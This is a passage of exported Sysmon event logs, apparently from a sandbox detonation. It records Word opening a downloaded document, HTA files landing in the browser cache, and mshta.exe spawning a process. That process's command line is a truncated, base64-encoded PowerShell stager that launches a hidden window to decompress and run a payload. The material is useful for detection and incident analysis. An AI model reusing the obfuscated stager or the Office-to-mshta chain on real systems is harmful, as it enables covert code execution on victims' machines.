UwBVAFkAVQBjAGcAYwBjAGoAVgBZADAAMgBEADAAKwAvAGsAagBSADcAOQBaAG4AQgBuAC8AOQAvAHAARABtAHMALwBjAGYAYgBkAHgASABKAE0AaQBVADQAUAB5AHgAKwB2ADMAQwBrADIANwAvAHMAKwBBAE4ATQBCAGQAaAAxAFEARQBJAFoAMgBZADMAMQAwAHkAagBzAHUAKwBUADQATQB3AGsAcQBBAHoAMAB3ADMAVgAvAHkAYQAvAGQAdQBKAGMANQBhADgAUABXAFUAeQB2AGcALwBmAGYAWgAxAHYAVwBVAEwAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBvACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-d380-67a4-4938-020000000000}
LogonId: 0x23849
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=BCC5A6493E0641AA1E60CBF69469E579,SHA256=7762A4766BC394B4CB2D658144B207183FF23B3139181CD74E615DB63E6E57D6,IMPHASH=C6A0924236A2CDF364F3D2FAD87F702A
ParentProcessGuid: {425f3eb2-c0cf-67a5-130e-000000000d00}
ParentProcessId: 5676
ParentImage: C:\Windows\SysWOW64\mshta.exe
ParentCommandLine: C:\Windows\SysWOW64\mshta.exe -Embedding
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","13747","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:07 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"File created:
RuleName: -
UtcTime: 2025-02-07 08:14:07.542
ProcessGuid: {425f3eb2-c0cf-67a5-130e-000000000d00}
ProcessId: 5676
Image: C:\Windows\SysWOW64\mshta.exe
TargetFilename: C:\Users\admin\AppData\Local\Microsoft\Windows\INetCache\IE\WW4TI035\default[1].hta
CreationUtcTime: 2025-02-07 08:14:07.542
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","13746","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:07 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: -
UtcTime: 2025-02-07 08:14:07.266
ProcessGuid: {425f3eb2-c0cf-67a5-130e-000000000d00}
ProcessId: 5676
Image: C:\Windows\SysWOW64\mshta.exe
FileVersion: 11.00.18362.1 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: C:\Windows\SysWOW64\mshta.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-d380-67a4-4938-020000000000}
LogonId: 0x23849
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=665D512BB2727713783B73F1B7FEB808,SHA256=4B82CFC44029D3D8462D60322FA0DBDE20F36C9C6791FA6F9B9F6A96FE44BF09,IMPHASH=4CB8A74361E70A5FF774A0A1A7C65989
ParentProcessGuid: {425f3eb2-d37f-67a4-1000-000000000d00}
ParentProcessId: 764
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM","1","5",,"4","1","0","-9223372036854775808","13745","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:07 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"File created:
RuleName: -
UtcTime: 2025-02-07 08:14:07.245
ProcessGuid: {425f3eb2-c0cd-67a5-110e-000000000d00}
ProcessId: 4652
Image: C:\Program Files (x86)\Microsoft Office\Office12\WINWORD.EXE
TargetFilename: C:\Users\admin\AppData\Local\Microsoft\Windows\INetCache\IE\OQS1X7LO\default[1].hta
CreationUtcTime: 2025-02-07 08:14:07.245
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","13744","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:07 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: -
UtcTime: 2025-02-07 08:14:06.422
ProcessGuid: {425f3eb2-c0ce-67a5-120e-000000000d00}
ProcessId: 9240
Image: C:\Windows\splwow64.exe
FileVersion: 10.0.18362.239 (WinBuild.160101.0800)
Description: Print driver host for applications
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: splwow64.exe
CommandLine: C:\Windows\splwow64.exe 8192
CurrentDirectory: C:\Windows\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-d380-67a4-4938-020000000000}
LogonId: 0x23849
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=DD8E5CAD821A7A4122D7FA0BF92512D6,SHA256=13D2146749C41278B0885DF1AD841892BD918BD369F9E2F82C4460676957F2D4,IMPHASH=BB4A4E0A5C490E9DC4C9BF373D974218
ParentProcessGuid: {425f3eb2-c0cd-67a5-110e-000000000d00}
ParentProcessId: 4652
ParentImage: C:\Program Files (x86)\Microsoft Office\Office12\WINWORD.EXE
ParentCommandLine: ""C:\Program Files (x86)\Microsoft Office\Office12\WINWORD.EXE"" /n /dde
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","13743","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:06 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: -
UtcTime: 2025-02-07 08:14:05.958
ProcessGuid: {425f3eb2-c0cd-67a5-110e-000000000d00}
ProcessId: 4652
Image: C:\Program Files (x86)\Microsoft Office\Office12\WINWORD.EXE
FileVersion: 12.0.4518.1014
Description: Microsoft Office Word
Product: 2007 Microsoft Office system
Company: Microsoft Corporation
OriginalFileName: WinWord.exe
CommandLine: ""C:\Program Files (x86)\Microsoft Office\Office12\WINWORD.EXE"" /n /dde
CurrentDirectory: C:\Users\admin\Downloads\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-d380-67a4-4938-020000000000}
LogonId: 0x23849
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=CEAA5817A65E914AA178B28F12359A46,SHA256=6C959CFB001FBB900958441DFD8B262FB33E052342948BAB338775D3E83EF7F7,IMPHASH=46337557842A2A62735BB11EB096B204
ParentProcessGuid: {425f3eb2-d382-67a4-7200-000000000d00}
ParentProcessId: 4284
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","13742","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:05 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
